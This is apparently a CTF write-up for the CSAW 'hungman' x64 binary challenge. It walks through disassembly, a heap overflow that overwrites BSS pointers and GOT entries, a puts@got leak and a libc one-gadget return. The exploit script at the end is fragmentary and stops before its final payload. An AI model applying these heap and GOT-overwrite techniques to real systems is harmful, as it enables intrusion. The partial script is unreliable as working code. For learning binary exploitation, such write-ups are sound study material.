### Solved by Swappage and Barrebas

hungman was a pretty funny x64 binary explitation challenge.

A quick look at the binary basics suggested that it was some sort of memory corruption that wasn't going to involve a traditional stack based buffer overflow, because of the protections in place.

    gdb-peda$ checksec
    CANARY    : ENABLED
    FORTIFY   : disabled
    NX        : ENABLED
    PIE       : disabled
    RELRO     : Partial

stack canary is in place and no forking() of any kind.. cool, time to start looking at the disassembly and see what happens.. but first, as usual let's do some dynamic analysis of the application and let's fuzz it a bit to see, from a behavioural point of view, what's going on here.

Upon connection to the service we are asked for a player name, then we are provided with a series of underscores that suggests we are playing the hungman game.
by specifying a letter, one per line, if we matched a letter in the word, that letter would appear in the next round.

what i could notice is that the length of the word we had to guess is directly related to the length of the username (more on this later).

By looking at the disassembler we see that, in main(), the application tries to open /dev/urandom, then the function at 0x00400f2d is called.

here we are asked for our player name and a chunk of proper size to accomodate the nick is allocated on the heap using malloc()

    |           0x00400fce      e8fdf8ffff     call sym.imp.malloc


At this point the real game begins: and in function at 0x00400b3a
is where the real magic happens.

the first thing we can see is that there are some values stored in the basics

- 0x00602100 stores a pointer to the player name on the heap
- 0x00602300 stores the high score

then we see that a quite copious amount of malloc() and free() are used.

The first malloc is used to allocate a chunk on the heap and read from /dev/urandom into it, this is used to generate a random string (the one we have to guess)

    |           0x00400b5b      e870fdffff     call sym.imp.malloc
    |           0x00400b60      488945e8       mov qword [rbp - local_18h], rax
    |           0x00400b64      48837de800     cmp qword [rbp - local_18h], 0
    |       ,=< 0x00400b69      0f84bc030000   je 0x400f2b
    |       |   0x00400b6f      8b45c4         mov eax, dword [rbp - local_3ch]
    |       |   0x00400b72      4863d0         movsxd rdx, eax
    |       |   0x00400b75      488b4de8       mov rcx, qword [rbp - local_18h]
    |       |   0x00400b79      8b45a4         mov eax, dword [rbp - local_5ch]
    |       |   0x00400b7c      4889ce         mov rsi, rcx
    |       |   0x00400b7f      89c7           mov edi, eax
    |       |   0x00400b81      e80afdffff     call sym.imp.read


at this point the game starts and we are asked to provide a letter one per line, there is a buffer constraint here, scanf reads only one char, so not a change for overflowing, if we provide more then one character on the same line, they are simply ingested one by one.
We are given an amount of chance also equal to the length of the string, if we fail, the game is over and we are asked if we want to restart from scratch, everything gets free()d and end of story.

To get in the interesting code branch we need to win.
This is quite simple, ok, we are dealing with a random string, but it's made only lowercase character, and it's the same length of the username we provide.. statistically speaking, to get a 100% win rate, what we had to do is to provide a username long enaugh, to have a word so long that every single lowercase letter in the ascii space has a 100% chance to occour at least once: i found out that i had a 100% hit rate with a word of 179 characters.

Upon winning, our new high score is registered and stored in the BSS, and we are also asked for a new username, and malloc is used again to store the new username on the heap.

By allocating a long enaugh username, i noticed that something really bad was happening.

- i could tamper the pointer to the username in the BSS (wtf?)
- i could tamper the score, also in the BSS
- but also.. i could tamper a parameter passed to malloc() if i decided to continue for a new game.

Here is where my brain started mumbling on overly complicated exploitation techniques. House of Mind? i control the malloc size, the username pointer for sure is for a leak, but the score? maybe for a fake chunk.. i was blurred, and at a certain point decided to try the ignorant way!

In a stile that can be best described by the following image

![](/images/2016/csaw/pwn300/wtfimdoing.jpg)

I ran through the first iteration to win the game, allocated a proper buffer that would allow me to leak the address of puts@got and continued with a second iteration.

    buffer = ""
    buffer += "A"*192
    buffer += p32(0xffffffff)
    buffer += p32(0xff)		# we can control the size of malloc in the second iteration
    buffer += p64(0x000000602020)
    #buffer += "C"*300
    buffer += "\n"

by punching in an overly long buffer, i noticed that i triggered a segmentation fault as i overwrote the pointer to printf() in the GOT with an invalid address.

    Program received signal SIGSEGV, Segmentation fault.
    RIP: 0x400860 (<snprintf@plt>:	jmp    QWORD PTR [rip+0x2017e2]        # 0x602048 <snprintf@got.plt>)
    gdb-peda$ x/16gx $rip+0x2017e2
    0x602042 <printf@got.plt+2>:	0x4242424242424242	0x4141414141414141
    0x602052 <memset@got.plt+2>:	0x4141414141414141	0x4141414141414141

Again, i really didn't know what i was doing, but still, i could control RIP.
i was a bit tired and offsets weren't aligning properly.. but as always Barrebas comes to the rescue fixing all the things, a quick return to libc with what i'd call 'an ignorant /bin/bash spray' :D and the flag is served.

The final exploit is the following (horrible) python script, for which i (Swappage) take all the blame.

```python

buffer += "\n"

buffer2 = ""
buffer2 +="A"*34

buffer2 += "A"*1020

#buffer2 = pattern2
#buffer2 +="\n"
#buffer2 = "A"*1024
#buffer2 += "\n"

#r = remote("localhost", 8888)
r = remote("pwn.chal.csaw.io", 8003)

raw_input()

print r.recvuntil("name?\n")
r.sendline("A"*176)

for a in string.lowercase:
	r.sendline(a)

r.sendline("y")
#print r.recvuntil("\n")
r.send(buffer)

leak = r.recv()
needle = re.compile(r'Highest player: (.*) score:')
m = re.search(needle, leak)

if m:
	puts = m.group(1)
	print puts
	while len(puts) < 8:
		puts += '\x00'
	print len(puts)
	puts_addr = struct.unpack('<Q', puts)[0]
	print hex(puts_addr)

base = puts_addr - 0x6f5d0
#base = puts_addr - 0x6b990	# bb
rce = base + 0x41347

buffer2 = "C"*40
